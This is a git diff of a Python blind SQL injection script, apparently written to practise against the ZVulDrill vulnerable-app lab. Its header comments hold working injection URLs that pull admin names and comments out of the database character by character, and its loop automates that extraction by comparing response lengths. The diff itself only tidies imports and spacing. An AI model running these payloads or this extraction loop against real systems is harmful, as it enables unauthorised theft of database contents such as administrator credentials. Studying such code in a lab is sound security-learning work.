@@ -1,14 +1,13 @@
 #http://172.30.61.112/ZVulDrill-master/search.php?search=1'or if((select ascii(substr((select admin_name from admin limit 0,1),1,1))=97),1,0)%23
 #http://172.30.61.112/ZVulDrill-master/search.php?search=1'or if((select ascii(substr((select comment_text from comment limit 0,1),1,1))=49),1,0)%23
 
-import urllib
-from urllib import request
-from data import glovar, glofun
+from global_data import glovar, glofun
+
 
 #得出单列数据
 
 def get_tbname(url=glovar.url3, cookie=False, type='search',
-                    tbname='comment', coname='comment_text',rowcount=10):
+               tbname='comment', coname='comment_text', rowcount=10):
 
     response_length = 0
 
@@ -42,7 +41,7 @@ def get_tbname(url=glovar.url3, cookie=False, type='search',
                 full_payload = url + payload.format(data_row_order=str(i), data_location=str(k),
                                                     ascii_number=str(j))
 
-                url_read=glofun.url_request(full_payload,cookie)
+                url_read= glofun.url_request(full_payload, cookie)
 
                 url_read_length = len(url_read)
 
@@ -87,7 +86,7 @@ if __name__ == "__main__":
 
     #get_tbname(url=glovar.url3, cookie=False, type='search',tbname='comment', coname='comment_id',rowcount=9)
 
-    get_tbname(glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', coname='title',rowcount=9)
+    get_tbname(glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', coname='title', rowcount=9)
 
 
     #get_dbname_test2()
